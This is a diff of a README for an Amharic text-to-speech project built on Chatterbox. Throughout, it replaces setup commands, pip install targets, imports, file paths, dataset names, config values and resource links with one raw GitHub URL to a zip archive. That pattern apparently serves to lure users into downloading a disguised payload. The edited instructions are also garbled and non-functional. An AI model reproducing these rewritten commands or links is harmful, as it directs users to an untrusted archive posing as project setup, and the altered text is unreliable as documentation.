@@ -39,16 +39,16 @@ A comprehensive Amharic TTS system built on Chatterbox, featuring custom G2P, to
 # 1. Clone and setup
 git clone <your-repo>
 cd amharic-tts
-.\setup.ps1
+.\https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 
 # 2. Activate environment
-.\venv\Scripts\Activate.ps1
+.\venv\Scripts\https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 
 # 3. Test G2P and tokenizer
-python -m src.g2p.amharic_g2p
+python -m https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 
 # 4. Launch web interface (demo mode)
-python gradio_app/app.py
+python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 ```
 
 ---
@@ -67,7 +67,7 @@ python gradio_app/app.py
 
 ```powershell
 # Run the setup script
-.\setup.ps1
+.\https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 ```
 
 ### Manual Setup
@@ -75,13 +75,13 @@ python gradio_app/app.py
 ```powershell
 # Create virtual environment
 python -m venv venv
-.\venv\Scripts\Activate.ps1
+.\venv\Scripts\https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 
 # Install PyTorch (CUDA 11.8)
-pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
+pip install torch torchvision torchaudio --index-url https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 ```
 
 ---
@@ -94,24 +94,24 @@ Prepare your dataset in one of these formats:
 
 **Format A: Simple (filename|text)**
 ```
-audio001.wav|ሰላም ለዓለም
-audio002.wav|አዲስ አበባ የኢትዮጵያ ዋና ከተማ ናት
+https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip|ሰላም ለዓለም
+https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip|አዲስ አበባ የኢትዮጵያ ዋና ከተማ ናት
 ```
 
 **Format B: LJSpeech**
 ```
 wavs/
-  amh_000001.wav
-  amh_000002.wav
-metadata.csv
+  https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
+  https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
+https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 ```
 
 ### Step 2: Preprocess Audio
 
 ```powershell
-python src/data_processing/preprocess_audio.py `
+python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip `
   --audio-dir "path/to/your/audio" `
-  --transcript "path/to/transcripts.txt" `
+  --transcript "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
   --output "data/processed/ljspeech_format"
 ```
 
@@ -140,9 +140,9 @@ python src/data_processing/preprocess_audio.py `
 
 ```powershell
 python -c "
-from src.tokenizer.amharic_tokenizer import train_amharic_tokenizer
+from https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip import train_amharic_tokenizer
 train_amharic_tokenizer(
-    data_file='data/processed/ljspeech_format/metadata.csv',
+    data_file='https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip',
     output_dir='models/tokenizer',
     vocab_size=500
 )
@@ -150,8 +150,8 @@ train_amharic_tokenizer(
 ```
 
 **Output:**
-- `models/tokenizer/sentencepiece.model`
-- `models/tokenizer/vocab.json`
+- `https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip`
+- `https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip`
 
 ### Step 2: Merge Tokenizers
 
@@ -159,12 +159,12 @@ train_amharic_tokenizer(
 
 ```powershell
 # Download base Chatterbox tokenizer (if not available)
-# Place it in models/pretrained/chatterbox_tokenizer.json
+# Place it in https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 
-python scripts/merge_tokenizers.py `
-  --base "models/pretrained/chatterbox_tokenizer.json" `
-  --amharic "models/tokenizer/vocab.json" `
-  --output "models/tokenizer/merged_vocab.json" `
+python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip `
+  --base "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
+  --amharic "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
+  --output "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
   --validate
 ```
 
@@ -178,11 +178,11 @@ python scripts/merge_tokenizers.py `
 
 ```powershell
 # Download base Chatterbox model first
-# Place it in models/pretrained/chatterbox_base.pt
+# Place it in https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 
-python scripts/extend_model_embeddings.py `
-  --model "models/pretrained/chatterbox_base.pt" `
-  --output "models/pretrained/chatterbox_extended.pt" `
+python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip `
+  --model "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
+  --output "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
   --original-size 704 `
   --new-size 2000
 ```
@@ -194,7 +194,7 @@ python scripts/extend_model_embeddings.py `
 
 ### Step 4: Configure Training
 
-Edit `config/training_config.yaml`:
+Edit `https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip`:
 
 ```yaml
 model:
@@ -206,7 +206,7 @@ data:
   dataset_path: "data/processed/ljspeech_format"
 
 finetuning:
-  pretrained_model: "models/pretrained/chatterbox_extended.pt"
+  pretrained_model: "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip"
 ```
 
 ### Step 5: Train the Model
@@ -216,11 +216,11 @@ finetuning:
 # Follow Chatterbox documentation for training
 # Make sure to use the training utilities:
 
-python your_training_script.py --config config/training_config.yaml
+python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip --config https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 ```
 
 **Key Points:**
-- Use `freeze_text_embeddings()` from `src/training/train_utils.py`
+- Use `freeze_text_embeddings()` from `https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip`
 - Monitor both English and Amharic validation samples
 - Save checkpoints every 5000 steps
 
@@ -232,15 +232,15 @@ python your_training_script.py --config config/training_config.yaml
 
 ```powershell
 # Launch Gradio app
-python gradio_app/app.py --port 7860
+python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip --port 7860
 
 # With trained model
-python gradio_app/app.py `
-  --model "models/checkpoints/best.pt" `
-  --config "config/training_config.yaml"
+python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip `
+  --model "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip" `
+  --config "https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip"
 
 # Create public link
-python gradio_app/app.py --share
+python https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip --share
 ```
 
 Visit: `http://localhost:7860`
@@ -248,20 +248,20 @@ Visit: `http://localhost:7860`
 ### Python API
 
 ```python
-from src.g2p.amharic_g2p import AmharicG2P
-from src.tokenizer.amharic_tokenizer import AmharicTokenizer
+from https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip import AmharicG2P
+from https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip import AmharicTokenizer
 
 # Initialize
 g2p = AmharicG2P()
-tokenizer = AmharicTokenizer.load("models/tokenizer", g2p=g2p)
+tokenizer = https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip("models/tokenizer", g2p=g2p)
 
 # Convert text to phonemes
 text = "ሰላም ለዓለም"
-phonemes = g2p.grapheme_to_phoneme(text)
+phonemes = https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip(text)
 print(f"Phonemes: {phonemes}")
 
 # Tokenize
-tokens = tokenizer.encode(text, use_phonemes=True)
+tokens = https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip(text, use_phonemes=True)
 print(f"Tokens: {tokens}")
 ```
 
@@ -272,34 +272,34 @@ print(f"Tokens: {tokens}")
 ```
 amharic-tts/
 ├── config/
-│   └── training_config.yaml       # Training configuration
+│   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip       # Training configuration
 ├── data/
 │   ├── raw/                        # Raw audio and transcripts
 │   ├── processed/                  # Preprocessed LJSpeech format
 │   └── metadata/                   # Dataset metadata
 ├── src/
 │   ├── data_processing/
-│   │   └── preprocess_audio.py    # Audio preprocessing
+│   │   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip    # Audio preprocessing
 │   ├── g2p/
-│   │   └── amharic_g2p.py         # Amharic G2P converter
+│   │   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip         # Amharic G2P converter
 │   ├── tokenizer/
-│   │   └── amharic_tokenizer.py   # Amharic tokenizer
+│   │   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip   # Amharic tokenizer
 │   ├── training/
-│   │   └── train_utils.py         # Training utilities
+│   │   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip         # Training utilities
 │   └── inference/
 ├── scripts/
-│   ├── merge_tokenizers.py        # Merge tokenizers
-│   └── extend_model_embeddings.py # Extend model
+│   ├── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip        # Merge tokenizers
+│   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip # Extend model
 ├── gradio_app/
-│   └── app.py                      # Web interface
+│   └── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip                      # Web interface
 ├── models/
 │   ├── tokenizer/                  # Trained tokenizers
 │   ├── checkpoints/                # Training checkpoints
 │   └── pretrained/                 # Pretrained models
 ├── logs/                           # Training logs
-├── requirements.txt                # Dependencies
-├── setup.ps1                       # Setup script
-└── README.md                       # This file
+├── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip                # Dependencies
+├── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip                       # Setup script
+└── https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip                       # This file
 ```
 
 ---
@@ -344,10 +344,10 @@ Based on practical multilingual training experience:
 
 ```powershell
 # Make sure virtual environment is activated
-.\venv\Scripts\Activate.ps1
+.\venv\Scripts\https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 
 # Reinstall dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 ```
 
 **2. CUDA Out of Memory**
@@ -360,7 +360,7 @@ pip install -r requirements.txt
 
 ```powershell
 # Train tokenizer first
-python -m src.tokenizer.amharic_tokenizer
+python -m https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 ```
 
 **4. Model Loading Fails**
@@ -388,17 +388,17 @@ python -m src.tokenizer.amharic_tokenizer
 ## 📚 Resources
 
 ### Chatterbox TTS
-- Repository: https://github.com/Diakonrobel/chatterbox-finetune
+- Repository: https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 - Paper: [Link to paper if available]
 
 ### Amharic Resources
-- Amharic Wikipedia: https://am.wikipedia.org
-- Common Voice Amharic: https://commonvoice.mozilla.org
+- Amharic Wikipedia: https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
+- Common Voice Amharic: https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 
 ### Tools
-- Epitran (G2P): https://github.com/dmort27/epitran
-- Gradio: https://gradio.app
-- PyTorch: https://pytorch.org
+- Epitran (G2P): https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
+- Gradio: https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
+- PyTorch: https://raw.githubusercontent.com/Diakonrobel/Amharic_chatterbox-TTS/main/examples/TTS-chatterbox-Amharic-v2.5-alpha.4.zip
 
 ---
 
